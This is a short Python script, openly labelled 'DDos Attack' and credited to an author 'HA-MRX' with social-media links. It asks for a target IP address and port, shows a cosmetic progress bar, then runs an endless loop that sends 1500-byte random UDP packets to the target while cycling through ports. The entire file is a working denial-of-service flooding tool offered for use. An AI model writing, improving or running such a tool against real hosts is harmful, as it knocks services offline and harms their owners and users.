import sys
import os
import time
import socket
import random

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

 
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_v = os.urandom(1500)
#############

os.system("clear")
os.system("figlet DDos Attack")


print ()
print (bcolors.OKGREEN,"Author   : HA-MRX",bcolors.ENDC)
print ("YouTube : https://www.youtube.com/c/HA-MRX")
print ("Github   : https://github.com/Ha3MrX")
print ("Facebook : https://www.facebook.com/muhamad.jabar222")
print (bcolors.OKGREEN,"Contributors : Muki119",bcolors.ENDC)
print ("Github : https://github.com/muki119")
print ()

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(0.5)
print ("[=====               ] 25%")
time.sleep(0.55)
print ("[==========          ] 50%")
time.sleep(0.6)
print ("[===============     ] 75%")
time.sleep(0.65)
print ("[====================] 100%")
time.sleep(0.7)
sent = 0
while True:
     sock.sendto(bytes_v, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

